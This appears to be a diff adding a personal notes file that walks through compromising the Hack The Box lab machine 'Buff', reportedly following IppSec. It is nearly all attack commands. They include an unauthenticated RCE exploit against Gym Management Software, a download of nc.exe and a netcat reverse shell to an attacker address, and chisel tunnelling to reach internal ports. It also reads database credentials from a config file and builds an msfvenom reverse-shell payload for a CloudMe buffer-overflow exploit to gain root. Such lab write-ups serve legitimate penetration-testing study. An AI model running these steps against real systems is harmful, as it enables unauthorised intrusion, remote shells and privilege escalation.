@@ -1,0 +1,47 @@
+//based in IppSec
+nmap -v -sC -sV -oN nmap_buff 10.10.10.198
+http://10.10.10.198:8080
+http://10.10.10.198:8080/contact.php
+//Gym Management Software 1.0
+searchsploit gym management	//unauth rce
+searchsploit -m php/webapps/48506.py
+vim exploit.py
+	proxies = {'http':'http://127.0.0.1:8080'}
+	proxies=proxies		//on each request, request.get, request.post
+python exploit.py http://10.10.10.198:8080/		//got restricted non persistent shell
+
+python3 -m http.server
+curl 10.10.14.2:8000/nc.exe -o nc.exe
+rlwrap nc -lvnp	9001
+nc.exe 10.10.14.26 9001 -e powershell	//got user
+
+C:\Users\shaun\Downloads\CloudMe_1112.exe
+searchsploit cloudme		/buffero overflow
+tasklist
+.\nc.exe -zv 8888
+
+download: chisel_1.7.6_linux_amd64.gz and chisel_1.7.6_windows_amd64.gz
+gunzip -d chisel_1.7.6_windows_amd64.gz
+win>curl 10.10.14.26:8000/chisel.exe -o chisel.exe
+
+gunzip -d chisel_1.7.6_linux_amd64.gz
+chmod +x chisel
+./chisel server --reverse --port 9002
+
+win>.\chisel.exe client 10.10.14.26:9002 R:3306:localhost:3306 R:8888:localhost:8888
+
+nc localhost 3306
+
+C:\xampp\htdocs\gym\include\db_connect.php
+root : 	//no password for db
+
+mysql -u root -p -h 127.0.0.1
+show databases;
+use phpmyadmin;
+select * from pma__userconfig;		//the empty pass for root we already had
+
+searchsploit cloudme
+searchsploit -m windows/remote/48389.py
+msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.26 LPORT= 9003 -b '\x00\x0A\x0D' -f python
+rlwrap nc -lvnp 9003
+python3 48389.py	//got root
